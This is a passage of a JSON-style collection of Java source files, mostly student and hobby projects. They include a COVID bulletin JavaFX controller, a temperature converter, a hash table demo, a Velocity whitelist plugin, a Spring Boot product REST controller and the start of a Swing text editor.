1),\n\t\t\t\tnew StudentMessage(\"\u041f\u0430\u0432\u043b\u0435\u043d\u043a\u043e \u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 1, 6), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0420\u0436\u0435\u0431\u0430\u0435\u0432 \u0410\u0440\u0442\u0451\u043c \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 9, 29), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0420\u0443\u0441\u0430\u043a\u043e\u0432 \u041d\u0430\u0437\u0430\u0440 \u041c\u0443\u0440\u0430\u0434\u043e\u0432\u0438\u0447\", LocalDate.of(2004, 4, 7), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0430\u043f\u043e\u0436\u043d\u0438\u043a\u043e\u0432\u0430 \u0412\u0438\u043e\u043b\u0435\u0442\u0442\u0430 \u041e\u043b\u0435\u0433\u043e\u0432\u043d\u0430\", LocalDate.of(2003, 2, 10), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0435\u043b\u0435\u0437\u043d\u0451\u0432 \u0412\u0430\u043b\u0435\u0440\u0438\u0439 \u0410\u043b\u0435\u043a\u0441\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 4, 28), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u043c\u0438\u0440\u043d\u043e\u0432 \u0418\u0432\u0430\u043d \u0421\u0435\u0440\u0433\u0435\u0435\u0432\u0438\u0447\", LocalDate.of(2003, 6, 16), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0421\u0443\u0447\u0438\u043b\u043a\u0438\u043d\u0430 \u0410\u043d\u0430\u0441\u0442\u0430\u0441\u0438\u044f \u0414\u043c\u0438\u0442\u0440\u0438\u0435\u0432\u043d\u0430\", LocalDate.of(2003, 9, 12), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0422\u0438\u0445\u043e\u043d\u043e\u0432 \u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432 \u0410\u043d\u0430\u0442\u043e\u043b\u044c\u0435\u0432\u0438\u0447\", LocalDate.of(2004, 4, 18), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0422\u043e\u043b\u043e\u0447\u0438\u043a \u0418\u0433\u043e\u0440\u044c \u0412\u043b\u0430\u0434\u0438\u043c\u0438\u0440\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 3, 26), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0423\u0433\u043e\u043b\u0435\u0432 \u0414\u0430\u043d\u0438\u0438\u043b \u0420\u043e\u043c\u0430\u043d\u043e\u0432\u0438\u0447\", LocalDate.of(2003, 8, 8), random.nextInt(100) + 1),\n\t\t\t\tnew StudentMessage(\"\u0425\u0430\u0440\u043b\u0430\u0448\u043a\u0438\u043d\u0430 \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u0430 \u0412\u0430\u0434\u0438\u043c\u043e\u0432\u043d\u0430\", LocalDate.of(2004, 8, 16), random.nextInt(100) + 1),\n\t\t};\n        for (StudentMessage studentMessage : arr) {\n            outputChannel.send(MessageBuilder.withPayload(studentMessage).build());\n        }\n\t}\n}\n",
    "package br.ifsp.covid.controller;\r\n\r\nimport br.ifsp.covid.model.Bulletin;\r\nimport br.ifsp.covid.model.DuplicatedBulletinException;\r\nimport br.ifsp.covid.model.State;\r\nimport br.ifsp.covid.persistence.BulletinDao;\r\nimport br.ifsp.covid.persistence.BulletinDaoImpl;\r\nimport br.ifsp.covid.view.BulletinApp;\r\nimport br.ifsp.covid.view.Funcao;\r\nimport javafx.collections.FXCollections;\r\nimport javafx.event.ActionEvent;\r\nimport javafx.fxml.FXML;\r\nimport javafx.scene.control.Button;\r\nimport javafx.scene.control.ComboBox;\r\nimport javafx.scene.control.DatePicker;\r\nimport javafx.scene.control.TextField;\r\n\r\nimport java.io.IOException;\r\nimport java.time.LocalDate;\r\nimport java.util.Arrays;\r\nimport java.util.List;\r\nimport java.util.stream.Collectors;\r\n\r\npublic class BulletinController {\r\n    @FXML private Button btnCancel;\r\n    @FXML private Button btnSave;\r\n    @FXML private TextField txtCity;\r\n    @FXML private ComboBox selectState;\r\n    @FXML private TextField txtInfected;\r\n    @FXML private TextField txtDeath;\r\n    @FXML private TextField txtIcuRatio;\r\n    @FXML private DatePicker selectDate;\r\n    private Bulletin bulletin;\r\n    private Funcao funcao;\r\n    private List<Bulletin> bulletinsList;\r\n\r\n    @FXML\r\n    private void initialize(){\r\n        final var stateNames = Arrays.stream(State.values())\r\n                .map(State::toString)\r\n                .collect(Collectors.toList());\r\n        selectState.setItems(FXCollections.observableArrayList(stateNames));\r\n    }\r\n    public void setBulletinIntoView(Bulletin bulletin){\r\n        txtCity.setText(bulletin.getCity());\r\n        selectState.setValue(State.fromName(String.valueOf(bulletin.getState())));\r\n        txtInfected.setText(String.valueOf(bulletin.getInfected()));\r\n        txtDeath.setText(String.valueOf(bulletin.getDeaths()));\r\n        txtIcuRatio.setText(String.valueOf(bulletin.getIcuRatio()));\r\n        selectDate.setValue(bulletin.getDate());\r\n    }\r\n    public Bulletin getBulletinFromView(){\r\n        if(bulletin==null)bulletin=new Bulletin();\r\n        bulletin.setCity(txtCity.getText());\r\n        bulletin.setState(State.fromName(String.valueOf(selectState.getValue())));\r\n        bulletin.setInfected(Integer.parseInt(txtInfected.getText()));\r\n        bulletin.setDeaths(Integer.parseInt(txtDeath.getText()));\r\n        bulletin.setIcuRatio(Double.parseDouble(txtIcuRatio.getText()));\r\n        bulletin.setDate(selectDate.getValue());\r\n        return bulletin;\r\n    }\r\n\r\n    public void cancelInfo(ActionEvent actionEvent) throws IOException {\r\n        BulletinApp.setRoot(\"bulletin_management\");\r\n    }\r\n\r\n    public void saveInfo(ActionEvent actionEvent) throws IOException {\r\n        bulletin = getBulletinFromView();\r\n        BulletinDao dao = new BulletinDaoImpl();\r\n        if(!verifyDupl(bulletin)){\r\n            switch (funcao){\r\n                case EDITAR -> dao.update(bulletin);\r\n                case SALVAR -> dao.insert(bulletin);\r\n            }\r\n        }\r\n        BulletinApp.setRoot(\"bulletin_management\");\r\n    }\r\n\r\n    private boolean verifyDupl(Bulletin bulletin) {\r\n        List<Bulletin> list = bulletinsList;\r\n        try {\r\n            for (Bulletin item : list) {\r\n                if (item.getCity().equals(bulletin.getCity()) && item.getDate().isEqual(bulletin.getDate()) && item.getId()!=bulletin.getId()){\r\n                    System.out.printf(\"Entrou\");\r\n                    throw new DuplicatedBulletinException();\r\n                }\r\n            }\r\n        }catch (DuplicatedBulletinException e){\r\n            e.alert();\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public void setBulletin(Bulletin bulletin) {\r\n        this.bulletin = bulletin;\r\n    }\r\n\r\n    public void setFuncao(Funcao funcao) {\r\n        this.funcao = funcao;\r\n    }\r\n\r\n    public void setBulletinsList(List<Bulletin> bulletinsList) {\r\n        this.bulletinsList = bulletinsList;\r\n    }\r\n}\r\n",
    "package vendingmachine;\r\n\r\nimport coin.Coin;\r\nimport inventory.Inventory;\r\nimport java.util.*;\r\n\r\npublic class VendingMachine {\r\n    private VendingMachineState vendingMachineState;\r\n    private Inventory inventory; \r\n    private List<Coin> coinList;\r\n\r\n    public VendingMachine() {\r\n        vendingMachineState = new VendingMachineState();\r\n        inventory = new Inventory(10);\r\n        coinList = new ArrayList<>();\r\n    }\r\n    \r\n\r\n    public VendingMachineState getVendingMachineState() {\r\n        return this.vendingMachineState;\r\n    }\r\n\r\n    public void setVendingMachinState(VendingMachineState vendingMachineState) {\r\n        this.vendingMachineState = vendingMachineState;\r\n    }\r\n\r\n    public Inventory getInventory() {\r\n        return this.inventory;\r\n    }\r\n\r\n    public void setInventory(Inventory inventory) {\r\n        this.inventory = inventory;\r\n    }\r\n\r\n    public List<Coin> getCoinList() {\r\n        return this.coinList;\r\n    }\r\n\r\n    public void setCoinList(List<Coin> coinList) {\r\n        this.coinList = coinList;\r\n    }\r\n   \r\n}\r\n",
    "package com.example.oxynews2;\n\npublic class ArticleData {\n    private String articleId;\n    private String title;\n    private String author;\n    private Integer date;\n    private String[] tags;\n\n    public ArticleData(){\n        this.articleId = \"\";\n        this.title = \"\";\n        this.author = \"\";\n        this.date = 0;\n        this.tags = new String[3];\n    }\n\n    public ArticleData(String articleId, String title, String author, Integer date, String tags){\n        this.articleId = articleId;\n        this.title = title;\n        this.author = author;\n        this.date = date;\n        this.tags = tags.split(\",\");\n    }\n\n    public ArticleData(String[] words){\n        this.articleId = words[0];\n        this.title = words[1];\n        this.author = words[2];\n        this.date = Integer.parseInt(words[3]);\n        this.tags = words[4].split(\",\");\n    }\n\n    public String getTitle(){\n        return this.title;\n    }\n\n    public String getAuthor(){\n        return this.author;\n    }\n    public String getDate(){\n        String str = \"\";\n        str += (date / 10000) + \"/\" + ((date % 10000) / 100) + \"/\" + (date % 100);\n        return str;\n    }\n}\n",
    "\nimport javax.swing.JOptionPane;\n\n/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n\n/**\n *\n * @author Ferrando Carlos\n */\npublic class Conversor extends javax.swing.JFrame {\n\n    /**\n     * Creates new form Conversor\n     */\n    public Conversor() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        seleccionTemp = new javax.swing.ButtonGroup();\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jPanel2 = new javax.swing.JPanel();\n        jrbtnCelcius = new javax.swing.JRadioButton();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel6 = new javax.swing.JLabel();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        jLabel9 = new javax.swing.JLabel();\n        jrbtnFahrenheit = new javax.swing.JRadioButton();\n        jLabel10 = new javax.swing.JLabel();\n        jtxtTemperatura = new javax.swing.JTextField();\n        jLabel2 = new javax.swing.JLabel();\n        jbtnConvertir = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setTitle(\"Conversor de Temperatura\");\n        setPreferredSize(new java.awt.Dimension(400, 400));\n        setSize(new java.awt.Dimension(400, 400));\n        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());\n\n        jPanel1.setBackground(new java.awt.Color(140, 100, 31));\n        jPanel1.setToolTipText(\"\");\n\n        jLabel1.setFont(new java.awt.Font(\"Monospaced\", 0, 36)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel1.setText(\"CONVERSOR DE  \");\n\n        jPanel2.setBackground(new java.awt.Color(140, 100, 31));\n\n        seleccionTemp.add(jrbtnCelcius);\n        jrbtnCelcius.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jrbtnCelciusActionPerformed(evt);\n            }\n        });\n\n        jLabel3.setFont(new java.awt.Font(\"Monospaced\", 0, 14)); // NOI18N\n        jLabel3.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel3.setText(\"Convertir de:\");\n\n        jLabel6.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel6.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel6.setText(\"\u00b0C\");\n\n        jLabel7.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel7.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel7.setText(\"\u00b0F\");\n\n        jLabel8.setFont(new java.awt.Font(\"Monospaced\", 0, 14)); // NOI18N\n        jLabel8.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel8.setText(\"Convertir de:\");\n\n        jLabel9.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel9.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel9.setText(\"\u00b0F\");\n\n        seleccionTemp.add(jrbtnFahrenheit);\n        jrbtnFahrenheit.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jrbtnFahrenheitActionPerformed(evt);\n            }\n        });\n\n        jLabel10.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel10.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel10.setText(\"\u00b0C\");\n\n        jtxtTemperatura.setBackground(new java.awt.Color(255, 255, 255));\n        jtxtTemperatura.setFont(new java.awt.Font(\"Monospaced\", 0, 18)); // NOI18N\n        jtxtTemperatura.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(235, 161, 35), 2, true));\n        jtxtTemperatura.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtTemperaturaActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel2Layout.createSequentialGroup()\n                        .addComponent(jLabel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                        .a",
    "package recursive;\r\n\r\nimport java.util.ArrayList;\r\n\r\npublic class prg2 {\r\n    // Number of buckets\r\n    private final int length;\r\n    // Hash table of size bucket\r\n    private final ArrayList<Integer>[] table;\r\n \r\n    public prg2(int length)\r\n    {\r\n        this.length = length;\r\n        this.table = new ArrayList[length];\r\n        for (int i = 0; i < length; i++) { \r\n            table[i] = new ArrayList<>();\r\n        }\r\n    }\r\n \r\n    // hash function to map values to key\r\n    public int hashFunction(int key)\r\n    {\r\n        return (key % length);\r\n    }\r\n \r\n    public void insertItem(int key)\r\n    {\r\n        // get the hash index of key\r\n        int index = hashFunction(key);\r\n        // insert key into hash table at that index\r\n        table[index].add(key);\r\n    }\r\n \r\n    public void deleteItem(int key)\r\n    {\r\n        // get the hash index of key\r\n        int index = hashFunction(key);\r\n \r\n        // Check if key is in hash table\r\n        if (!table[index].contains(key)) {\r\n            return;\r\n        }\r\n \r\n        // delete the key from hash table\r\n        table[index].remove(Integer.valueOf(key));\r\n    }\r\n \r\n    // function to display hash table\r\n    public void displayHash()\r\n    {\r\n        for (int i = 0; i < length; i++) {\r\n            System.out.print(i);\r\n            for (int x : table[i]) {\r\n                System.out.print(\" -->> \" + x);\r\n            }\r\n            System.out.println();\r\n        }\r\n    }\r\n \r\n    // Drive Program\r\n    public static void main(String[] args)\r\n    {\r\n        // array that contains keys to be mapped\r\n        int[] a = { 50, 700, 76, 85, 92, 73, 101 };\r\n \r\n        // Create a empty has of BUCKET_SIZE\r\n        prg2 h = new prg2(7);\r\n\r\n        // insert the keys into the hash table\r\n        for (int x : a) {\r\n            h.insertItem(x);\r\n        }\r\n \r\n        // delete 12 from the hash table\r\n       \r\n \r\n        // Display the hash table\r\n        h.displayHash();\r\n    }\r\n}\r\n\r\n",
    "// Clase que representa a un cliente\npublic class Cliente {\n\n    // Atributos de la clase \"Cliente\"\n    private String nombre;    \n    private String Cedula;\n    private String fecha;\n    private Nivel_Ingresos nivel_ingresos;\n    private int ahorro; \n\n\n    // Constructor de la clase \"Cliente\" con par\u00e1metros\n    public Cliente(String nombre, String cedula, String fecha, Nivel_Ingresos nivel_ingresos, int ahorro) {\n        this.nombre = nombre;\n        this.Cedula = cedula;\n        this.fecha = fecha;\n        this.nivel_ingresos = nivel_ingresos;\n        this.ahorro = ahorro;\n    }\n\n    // Constructor de la clase Cliente sin par\u00e1metros\n    public Cliente() {\n    }\n\n    // M\u00e9todo getter para obtener el nombre del cliente\n    public String getNombre() {\n        return nombre;\n    }\n\n    // M\u00e9todo setter para establecer el nombre del cliente\n    public void setNombre(String nombre) {\n        this.nombre = nombre;\n    }\n\n    // M\u00e9todo getter para obtener la c\u00e9dula del cliente\n    public String getCedula() {\n        return Cedula;\n    }\n\n    // M\u00e9todo setter para establecer la c\u00e9dula del cliente\n    public void setCedula(String cedula) {\n        Cedula = cedula;\n    }\n\n    // M\u00e9todo getter para obtener la fecha de incorporaci\u00f3n del cliente\n    public String getFecha() {\n        return fecha;\n    }\n\n    // M\u00e9todo setter para establecer la fecha de incorporaci\u00f3n del cliente\n    public void setFecha(String fecha) {\n        this.fecha = fecha;\n    }\n\n    // M\u00e9todo getter para obtener el nivel de ingresos del cliente\n    public Nivel_Ingresos getNivel_ingresos() {\n        return nivel_ingresos;\n    }\n\n    // M\u00e9todo setter para establecer el nivel de ingresos del cliente\n    public void setNivel_ingresos(Nivel_Ingresos nivel_ingresos) {\n        this.nivel_ingresos = nivel_ingresos;\n    }\n\n    // M\u00e9todo getter para obtener el ahorro del cliente\n    public int getAhorro() {\n        return ahorro;\n    }\n\n    // M\u00e9todo setter para establecer el ahorro del cliente\n    public void setAhorro(int ahorro) {\n        this.ahorro = ahorro;\n    }\n}\n\n",
    "package net.pandadev.vitelist;\n\nimport com.google.inject.Inject;\nimport com.velocitypowered.api.command.CommandManager;\nimport com.velocitypowered.api.event.Subscribe;\nimport com.velocitypowered.api.event.connection.PostLoginEvent;\nimport com.velocitypowered.api.event.proxy.ProxyInitializeEvent;\nimport com.velocitypowered.api.plugin.Plugin;\nimport com.velocitypowered.api.plugin.annotation.DataDirectory;\nimport com.velocitypowered.api.proxy.Player;\nimport com.velocitypowered.api.proxy.ProxyServer;\nimport net.kyori.adventure.text.Component;\nimport org.slf4j.Logger;\nimport org.spongepowered.configurate.ConfigurateException;\nimport org.spongepowered.configurate.yaml.YamlConfigurationLoader;\n\nimport java.nio.file.Path;\nimport java.util.List;\n\n@Plugin(\n        id = \"vitelist\",\n        name = \"Main\",\n        version = \"1.0\",\n        description = \"A simple but useful whitelist plugin for Velocity\",\n        url = \"https://pandadev.net\",\n        authors = {\"PandaDEV\"}\n)\npublic class Main {\n\n    public static String prefix = \"\u00a7d\u00a7lVitelist \u00a78\u00bb \";\n    @Inject\n    private Logger logger;\n    @Inject\n    private ProxyServer server;\n    @Inject\n    @DataDirectory\n    private Path dataDirectory;\n    private YamlConfigurationLoader loader;\n    private boolean whitelistEnabled = true;\n\n    @Subscribe\n    public void onProxyInitialization(ProxyInitializeEvent event) {\n        loader = YamlConfigurationLoader.builder().path(dataDirectory.resolve(\"config.yml\")).build();\n        try {\n            var root = loader.load();\n            if (!root.node(\"whitelisted-uuids\").virtual()) {\n                whitelistEnabled = root.node(\"whitelist-enabled\").getBoolean(true);\n            } else {\n                root.node(\"whitelisted-uuids\").set(List.of());\n                root.node(\"whitelist-enabled\").set(true);\n                loader.save(root);\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to load/create config file\", e);\n        }\n\n        CommandManager commandManager = server.getCommandManager();\n        commandManager.register(commandManager.metaBuilder(\"vlist\").build(), new VlistCommand(this));\n    }\n\n    @Subscribe\n    public void onPlayerJoin(PostLoginEvent event) {\n        if (!whitelistEnabled) return;\n        Player player = event.getPlayer();\n        try {\n            var root = loader.load();\n            List<String> whitelistedUuids = root.node(\"whitelisted-uuids\").getList(String.class);\n            if (!whitelistedUuids.contains(player.getUniqueId().toString())) {\n                player.disconnect(Component.text(\"You are not whitelisted on this server.\"));\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to check whitelist\", e);\n        }\n    }\n\n    public YamlConfigurationLoader getLoader() {\n        return loader;\n    }\n\n    public void setWhitelistEnabled(boolean whitelistEnabled) {\n        this.whitelistEnabled = whitelistEnabled;\n    }\n\n    public static String getPrefix() {\n        return prefix;\n    }\n}",
    "package Class;\n\n//creating class\npublic class Student {\n\n    //attributes\n    public String name;\n    public int registration;\n    public Course course;   //attribute from Course\n    public int age;\n    public int discount;\n\n\n    public Student(String name, int registration, Course course, int age, int discount) {\n        if(name != null && !name.isEmpty()){\n            this.name = name;\n        } else {\n            System.out.println(\"Error: invalid name\");\n        }\n        if (registration >= 0){\n            this.registration = registration;\n        } else {\n            System.out.println(\"Error: invalid registration\");\n        }\n        if(course != null){\n            this.course = course;\n        } else {\n            System.out.println(\"Error: invalid course\");\n        }\n        if(age > 0){\n            this.age = age;\n        } else {\n            System.out.println(\"Error: invalid age\");\n        }\n        if(discount >= 0){\n            this.discount = discount;\n        } else {\n            System.out.println(\"Error: invalid discount\");\n        }\n    }\n\n    //methods\n    public double studentDiscount(){\n        double discountedPrice = course.price * (this.discount / 100.0); //calculation\n        if (discountedPrice < 0) {\n            System.out.println(\"Error: Invalid discount value.\");\n            return 0;\n        }\n        System.out.println(\"\\n-PRICE-\");\n        System.out.printf(\"Discounted Price: %.2f\", discountedPrice);\n        double newPrice = course.price - discountedPrice; //print the result\n        System.out.printf(\"\\nNew price: %.2f\", newPrice);\n        return newPrice;\n    }\n    //update discount value\n    public void updateDiscount(int newDiscount) {\n        if (newDiscount < 0) {\n            System.out.println(\"Error: Invalid new discount value.\");\n        }\n        System.out.println(\"\\nDISCOUNT HAS BEEN UPDATED\");\n        this.discount = newDiscount;\n    }\n    public void updateData(String newName, int newRegistration, Course newCourse, int newAge, int newDiscount){\n        //verify if name is not null or empty\n        if(newName != null && !newName.isEmpty()){\n            System.out.println(\"\\nDATA HAS BEEN UPDATED\");\n            this.name = newName;\n        } else {\n            System.out.println(\"Error: invalid new name\");\n        }\n        //verify if registration is not negative or zero\n        if(newRegistration > 0) {\n            this.registration = newRegistration;\n        } else {\n            System.out.println(\"Error: new registration invalid\");\n        }\n        //verify if course is not empty or null\n        if(newCourse != null && !newCourse.name.isEmpty()) {\n            this.course = newCourse;\n        } else {\n            System.out.println(\"Error: new course invalid\");\n        }\n        //verify if new age is positive\n        if(newAge > 0) {\n            this.age = newAge;\n        } else {\n            System.out.println(\"Error: invalid new age\");\n        }\n        //check id the new discount is within a valid range\n        if(newDiscount >= 0 && newDiscount<= 100) {\n            this.discount = newDiscount;\n        } else {\n            System.out.println(\"Error: invalid new discount\");\n        }\n    }\n\n}",
    "package com.example.springboot.controllers;\n\nimport com.example.springboot.dtos.ProductRecordDto;\nimport com.example.springboot.models.ProductModel;\nimport com.example.springboot.repositories.ProductRepository;\nimport jakarta.validation.Valid;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.UUID;\n\nimport static org.springframework.hateoas.server.mvc.WebMvcLinkBuilder.linkTo;\nimport static org.springframework.hateoas.server.mvc.WebMvcLinkBuilder.methodOn;\n\n@RestController\npublic class ProductController {\n\n    @Autowired\n    ProductRepository productRepository;\n\n    @PostMapping(\"/products\")\n    public ResponseEntity<ProductModel> saveProduct(@RequestBody @Valid ProductRecordDto productRecordDto) {\n        var productModel = new ProductModel();\n        BeanUtils.copyProperties(productRecordDto, productModel);\n        return ResponseEntity.status(HttpStatus.CREATED).body(productRepository.save(productModel));\n    }\n\n    @GetMapping(\"/products\")\n    public ResponseEntity<List<ProductModel>> getAllProducts(){\n        List<ProductModel> productsList = productRepository.findAll();\n        if (!productsList.isEmpty()){\n            for (ProductModel product : productsList){\n                UUID id = product.getIdProduct();\n                product.add(linkTo(methodOn(ProductController.class).getOneProduct(id)).withSelfRel());\n            }\n        }\n        return ResponseEntity.status(HttpStatus.OK).body(productsList);\n    }\n\n    @GetMapping(\"/products/{id}\")\n    public ResponseEntity<Object> getOneProduct(@PathVariable(value = \"id\") UUID id){\n        Optional<ProductModel> productO = productRepository.findById(id);\n        if(productO.isEmpty()){\n            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(\"Product not found.\");\n        }\n        productO.get().add(linkTo(methodOn(ProductController.class).getAllProducts()).withRel(\"Products List\"));\n        return ResponseEntity.status(HttpStatus.OK).body(productO.get());\n    }\n\n    @PutMapping(\"/products/{id}\")\n    public ResponseEntity<Object> updateProduct(@PathVariable(value = \"id\") UUID id,\n                                                @RequestBody @Valid ProductRecordDto productRecordDto) {\n        Optional<ProductModel> productO = productRepository.findById(id);\n        if (productO.isEmpty()){\n            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(\"Product not found.\");\n        }\n        var productModel = productO.get();\n        BeanUtils.copyProperties(productRecordDto, productModel);\n        return ResponseEntity.status(HttpStatus.OK).body(productRepository.save(productModel));\n    }\n\n    @DeleteMapping(\"/products/{id}\")\n    public ResponseEntity<Object> deleteProduct(@PathVariable(value = \"id\") UUID id) {\n        Optional<ProductModel> productO = productRepository.findById(id);\n        if (productO.isEmpty()) {\n            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(\"Product not found.\");\n        }\n        productRepository.delete(productO.get());\n        return ResponseEntity.status(HttpStatus.OK).body(\"Product deleted Successfully.\");\n    }\n}\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\nimport java.io.*;\nimport java.awt.Desktop;\nimport java.net.URI;\n\npublic class Main {\n    public static void main(String[] args) {\n        // Git visible?\n        int choice = JOptionPane.showConfirmDialog(null, \"\u0423\u0434\u0430\u0447\u0438!/Good Luck!/Viel Gl\u00fcck!\", \"SMS\", JOptionPane.DEFAULT_OPTION, JOptionPane.PLAIN_MESSAGE);\n\n        JFrame frame = new JFrame(\"TextEdtior\"); // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043e\u043a\u043d\u0430\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);// \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043a\u043d\u043e\u043f\u043a\u0438 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435\n        frame.setSize(1000, 1000); // \u0440\u0430\u0437\u043c\u0435\u0440 \u043e\u043a\u043d\u0430\n        JTextArea textArea = new JTextArea();\n        String iconPath = \"f.png\"; // \u043f\u0443\u0442\u044c \u043a \u0438\u043a\u043e\u043d\u043a\u0435 \u0444\u0430\u0439\u043b\u0430 \u0444\u043e\u0442\u043a\u0438\n        ImageIcon icon = new ImageIcon(iconPath); // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0438\u043a\u043e\u043d\u043a\u0438 \u0441 \u044d\u0442\u0438\u043c \u043f\u0443\u0442\u0435\u043c\n        JScrollPane scrollPane = new JScrollPane(textArea);\n        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);\n        JPanel lineNumbersPanel = new JPanel(new BorderLayout());\n        JTextArea lineNumbersTextArea = new JTextArea(\"1: \\n\"); // \u043d\u0443\u043c\u0435\u0440\u0430\u0446\u0438\u044f \u043f\u043e\u043a\u0430 \u0447\u0442\u043e \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0434\u0438\u043d \u0435\u0441\u0442\u044c\n        lineNumbersTextArea.setEditable(false);\n        lineNumbersPanel.add(lineNumbersTextArea, BorderLayout.CENTER);\n        scrollPane.setRowHeaderView(lineNumbersPanel);\n\n        // jmenu\n        JMenuBar menuBar = new JMenuBar();\n        JMenuBar infoBar = new JMenuBar();\n        JMenu infoMenu = new JMenu(\"info\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenu fileMenu = new JMenu(\"file\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem openFile = new JMenuItem(\"Open\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem saveFile = new JMenuItem(\"Save\"); // \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem support = new JMenuItem(\"Support developer\");// \u043a\u043d\u043e\u043f\u043e\u0447\u043a\u0438 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 file\n        JMenuItem Website = new JMenuItem(\"You can also visit my website\");\n        JCheckBox checkBox = new JCheckBox(\"test click me\");\n\n        // function\n        openFile.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n            public void actionPerformed(ActionEvent e) {\n                JFileChooser fileChooser = new JFileChooser();\n                if (fileChooser.showOpenDialog(frame) == JFileChooser.APPROVE_OPTION) {\n                    File file = fileChooser.getSelectedFile();\n                    try {\n                        BufferedReader 